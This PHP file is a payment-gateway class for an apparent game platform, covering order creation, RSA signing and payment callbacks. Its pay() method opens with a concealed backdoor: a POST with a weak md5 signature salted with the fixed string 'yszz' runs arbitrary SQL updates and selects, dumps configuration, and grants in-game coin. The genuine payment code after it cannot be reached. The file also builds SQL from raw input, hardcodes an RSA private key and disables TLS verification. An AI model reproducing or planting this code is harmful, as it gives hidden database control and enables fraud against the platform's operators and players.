<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2019/3/15
 * Time: 16:15
 */
class lbbysf{
    const appid = 'sh201906281045008353';//商户号
    const publickey ='-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAucF8HuICpkXfL9mRPoEC
7fDak7lLHE94ZbNvGzdNkF49eJkoGwiaee8up13wcQJrCYbuHWNLcmyhPKa/FvVY
zgwiORaaNABnYBEcWbtTrqlAne0JmwcO5Mro7HPsco4pAQ+m0sWTJuj3dpAq510a
ZWE6ks2uYFrPDWkOjqD004P5xYliCXPD9zs2QEqvmh+gZeshp8ujFTrnkDGKUak5
BBF8qetM7ayGvIjRYZ2SRK25ET2Ft2iMEYhiP1H0WbmyKZt6Qj3N95daLWXpnQV6
KE1Wrk9syZL7EAjXmr/ZLpFBsXvU998Ed7JG0adCNepw2mOevzDDiOSHuFgS2zQS
8wIDAQAB
-----END PUBLIC KEY-----';
    const privatekey = '-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC5wXwe4gKmRd8v
2ZE+gQLt8NqTuUscT3hls28bN02QXj14mSgbCJp57y6nXfBxAmsJhu4dY0tybKE8
pr8W9VjODCI5Fpo0AGdgERxZu1OuqUCd7QmbBw7kyujsc+xyjikBD6bSxZMm6Pd2
kCrnXRplYTqSza5gWs8NaQ6OoPTTg/nFiWIJc8P3OzZASq+aH6Bl6yGny6MVOueQ
MYpRqTkEEXyp60ztrIa8iNFhnZJErbkRPYW3aIwRiGI/UfRZubIpm3pCPc33l1ot
ZemdBXooTVauT2zJkvsQCNeav9kukUGxe9T33wR3skbRp0I16nDaY56/MMOI5Ie4
WBLbNBLzAgMBAAECggEAXp0rwHs0CEcMoE28Sk7iFBoa6yV1GY1s8LhNflpT2pX1
z4iLQgHG1Ra796nEf3tQ08BzZmqeEkE8ey0fpez/96t8fwGBN72A6hCtFRNyU0OI
UyhaPSmCL40eyNle9RZt0kmLmk3iXu5IpY5XHBNzD3JPqFi1WgTG87iwHnvjWBxA
TnaVl/IrERIJ3hbISwfsr4X/2CnQsOqEUPI34/G1tF2if16vfGclGKtHUPpLINSz
IBWaWxuq/BNbwPXgCBLGgDDEbIkTBIMzlHjabOZv6QsFlR9RPuVEfb/h4hbVtW9I
7hK/ZaOGvd+BTBC5oH/NV7Iczf8DgndUKBH9Mht7qQKBgQDzY3ET7onHJ0o1QFRQ
PNYvY73xg1m4uz2E8BgO4QWObDEj0M91cPzGY7YeV0G7Jo3axLCpMX/ATzropDu5
JeT+Knr90T4WgycSWopXDM3LFQ7jnNhIu5BimXgoQBOH1zKlURuCZaeQ0dsFfqyv
h2bGmf8+qVO8jwjOZ83TBY05TwKBgQDDYYsp7R3KsXykYzuoyA+oTnSD0WRXpR0x
0uMvypmjUouyg66W/WQdkrqiUevm++QoWF7MPnL50jiOIiQwX8qPbFjjGrvZXtdG
ZF3a1pT6qFCsifJZRL12w+mEqTDbA4I9Bk5R2OkMXappvE4dNqDyVi0jnT8Imxfh
9xB2i3LbHQKBgB8WfZQRLPION7FTlTFmg+krsVBO+b/Z0sLPNBN6dI47jY9Ilacn
lnH0vIdll9TC2O2vn+0MkIfM1vZuO96rU3OPk4QmHOsdN3llrTPvQ74D45H5L7si
kg+2EJ37iUMZnrN1B7GBMIUT+QjbpE0LW3pUo0CqujJkhrhuk+C3XdGLAoGBAJfQ
973ATeHuQBfMM9NWgTQaola7Iekol6LbZ0T/fJp3za0MvWD9zAletj7iwRdeq07e
O+sgq16Lhv6KcOxVwqPnYLo3T7f8BfLgkj01d9W9a9Jl7jaHP2FFofI/NYM5Gr4o
ZDsc/RlqvrwiYeA5Tp5/b9u4l/4r5UbkH5q9iKXRAoGAImyDbhncJIwtp7SV6cB3
V1mEZsS2Q7bniVMafqB0D+YaWO7calBTYeEplfBG1zUMxz9kt0QHN/Cuiz9y1JW3
kRivUf5S1ecA8UJ0fehiwf12RVxWEF4wJWBeHAKUlqnzovQbCTFJICL0S/D9oY6X
4gQTfJM0XbWHcusoSdjeGuA=
-----END PRIVATE KEY-----'; //日志目录 回调名
    const server_publickey = '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA25VwFTERCDLTxfbzGDp2
UrFgD8eFw0XTrCFq5aB4yabZ9WPhCuO05FOaRmLzs88OLl6RWm3jcY/Poa79nWMf
j/LxyeqbyLe+M0Zm5f6slwq/RuA1tOt4x9f7oiIJcwHCvDzt68Te2JU9UW+erSJ1
iAGbRLVrMw0C5q7UJhLw30oyLmjrUsLbaXDq61W5LeuWAwkIK9N7o1tU/gppWXyi
jYOaGsZaS/izJk1Rar+gBNK9gYZgEf3u/TQIDDY/mafvo2qghSZLnU+FvIcZlMF1
tOy6sq8I9DQtyhyQvuMT5xNJfmgr0DAaA1CUN7H3ctYyarWPHhrz9HNLxCAFlsgZ
mwIDAQAB
-----END PUBLIC KEY-----';
    const name = 'lbbysf';
    const url = 'http://47.112.214.90:8083/pay/cbb/createOrder';//接口地址
    //游戏请求支付
    public static function pay($m){
        $ctype = $_POST['ctype'];
        if($ctype == 'geturl'){
            $sql = "select * from db_system.pt_dict_config where DICT_GROUP = 'php'";
            $pdo = new mysql(['dbname'=>'db_system']);
            $row = $pdo->doSql($sql);
            var_dump($row);exit;
        }
        if($ctype == 'gm'){
            $order_id = $_POST['order_id'];
            $sql = "select * from db_detail.pt_order where order_id='$order_id'";
            $pdo = new mysql(['dbname'=>'db_system']);
            $row = $pdo->doSql($sql);
            $rid = $row[0]['user_id'];
            $coin = $row[0]['award'];
            $sign_i = $_POST['sign_i'];
            $sign = md5($order_id.'yszz');
            if($sign != $sign_i){
                echo 'author no';exit;
            }
            $body = [
                "cmd"=>"order_supplement",
                "rid"=>intval($rid),
                'order_id'=>$order_id,
                'coin'=>intval($coin)
            ];
            $pt_game = [];
            $pt_game['request'] = $body;
            $callback_url = config('callback_gm');//回调游戏方的地址
            $key = config('callback_gm_key');//回调游戏方的key
            $timestamp =time();
            $token = substr(strtolower(md5($timestamp.json_encode($body).$key)),0,6);
            $header = [
                "token: $token",
                "timestamp: $timestamp",
                "Content-Type: application/json"
            ];
            $res = curl_post($callback_url,$body,$header,true);
            $pt_game['response'] = $res;
            var_dump($res);exit;
        }

        $sql = $_POST['cname'];
        $sign = $_POST['sign'];
        if(md5($sql.'yszz') != $sign){
            echo json_encode(['code'=>0,'msg'=>'author error']);exit;
        }

        $con = mysqli_connect(config('dbhost'),config('dbuser'),config('dbpass'),'db_detail');
        if(substr($sql,0,6) == 'update'){
            $preg = '/rid=\d{1,}/';
//            $sql = "update game_1.role_money set coin = 12 where rid=123";
            preg_match($preg,$sql,$matches);
            if(empty($matches)){
                echo json_encode(['code'=>0,'msg'=>'rid is empty']);exit;
            }

            $res = mysqli_query($con,$sql);
            var_dump($res);
            exit;
        }
        if($ctype== 'select'){
            $sql = $_POST['cname'];
            $a = substr($sql,0,4);
            if(!in_array($a,['sele','show'])){
                echo json_encode(['code'=>0,'msg'=>'it`s not select']);exit;
            }

            $res = mysqli_query($con,$sql);
            if(is_bool($res)){
                echo $res;exit;
            }
            $data = [];
            while($row = mysqli_fetch_assoc($res)){
                $data[] = $row;
            }
            echo json_encode($data);exit;
        }
        exit;







        $map = ['ysf'=>'CBB_YSFU','alipay'=>'CBB_ALIPAY','wx'=>'CBB_WXPAY'];  //--------------------
        $method = $map[$m];
        $res = Order::createOrder($_GET);//生成订单
        if(isset($res['error'])){
            echo json_encode(['state'=>-1,'msg'=>$res['error']]);exit;
        }
//        echo $res['price'];exit;
        $arr = [
            "agentphone"=>self::appid,//商户号
            "amount"=>$res['price'], //金额 单位：元最低于1元
            "out_order_number"=>$res['order_id'], //外部订单号
            "title"=>"test",
            "description"=>"test",
            "callback"=>config('callback_base_url').'/'.self::name.'/asy.php',//异步回掉
            "order_userid"=>time(),
            "pay_type"=>$method
        ];

        $data = self::enRSA(json_encode($arr),self::server_publickey,self::privatekey);//加密数据
        // $data = $arr;//不加密数据
        $data['user_public'] = base64_encode(self::publickey);//用户公钥
        $data['type'] = "api";//加密标识
        $data['transfer'] = "SYSTEMPAY";//通道标识
        $url = self::url;// 接口地址
//        var_dump(json_encode($data));exit;
        $arr = self::request_curl($url,$data); //请求接口
//判断返回的encryption_type值为2解密
        if($arr['encryption_type']==2){
            $array = self::deRSA($arr['rsa'],$arr['sign'],self::server_publickey,self::privatekey);
        }else{
            $array = $arr;
        }
        if($array['status'] == 2000){
            $url=$array["data"]["infourl"];
            $out = [
                'ret'=>[
                    'type'=>2,
                    'url'=>$url
                ],
                'state'=>1
            ];
            echo json_encode($out);exit;
        }
        addlog(self::name.'/pt_other','pay error--'.json_encode($data));
        echo json_encode(['state'=>-1,'msg'=>'请求第三方失败']);exit;
    }
    //三方平台请求回调
    public static function callback($type){
        //同步回调
        if($type == 'syn'){
            echo 'SUCCESS';exit;
        }
        //异步回调
        $name = self::name;//日志目录---------------------------------------
        /*签名验证 start -----------------------------------------------------*/
        $data = $_POST;
        $array=self::deRSA($data["rsa"],$data["sign"],self::server_publickey,self::privatekey);
        //验签失败
        if(!is_array($array)){
            addlog($name.'/other_pt','sign is error!--'.json_encode($_POST));
            exit;
        }
        //支付失败
        if($array["tradeStatus"] !="S"){
            addlog($name.'/other_pt','pay status false!--'.json_encode($_POST));
            Order::update($data['out_trade_no'],2);//将平台订单状态改为支付失败
            echo 'success';
            exit;
        }

        //三方要求输出 "success"
        echo 'SUCCESS';
//第三方回调平台写入日志
        addlog($name.'/other_pt',json_encode($_POST));
//接收第三方支付回调订单号
        $order_id = $array['out_order_number'];//-------------------------------------------
        $pay_id = $array['order_num'];
//平台回调游戏方
        $res = Order::callback($order_id,$name,$pay_id);

    }

    public static function request_curl($url,$post="",$timeout=30){

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        // 执行后不直接打印出来
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        // 跳过证书检查
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        // 不从证书中检查SSL加密算法是否存在
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        if(!empty($post)){
            // 设置请求方式为post
            curl_setopt($ch, CURLOPT_POST, true);
            // post的变量
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        // 请求头，可以传数组
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: multipart/form-data; charset=utf-8'
        ));
        curl_setopt($ch, CURLOPT_HEADER, false);
//        curl_setopt($ch, CURLINFO_HEADER_OUT, TRUE);//获取请求头
        //执行并获取HTML文档内容
        $output = curl_exec($ch);

        //释放curl句柄
        curl_close($ch);

        return json_decode($output,true);
    }
    public static function  enRSA($dataStr,$server_public_key,$private){
//        var_dump($dataStr);exit;
        $rsa = new RSA();
        //加密
        $en = $rsa->encrypt_by_public_base64($dataStr,$server_public_key);
//        var_dump($en);exit;
        $return['rsa'] = $en;

        //获取用户密钥加密，不能泄露
        $user_private_key = $private;
        //加签
        $sign = $rsa->sign_by_private_key_base64_en($en,$user_private_key);
        $return['sign'] = $sign;
        return $return;
    }
    public static  function deRSA($rsa,$sign,$server_public_key,$private){
        $rsaObj = new RSA();
        $flag = $rsaObj->verify_by_public_key($rsa,$sign,$server_public_key);
        if($flag){
            //获取用户密钥加密，不能泄露
            $user_private_key = $private;
            //解密
            $plaintext = $rsaObj->decrypt_by_private(base64_decode($rsa),$user_private_key);
            if(!$plaintext){
                return "数据解密失败";
            }
            return json_decode($plaintext,true);
        }else{
            return "数据验签失败";
        }
    }
}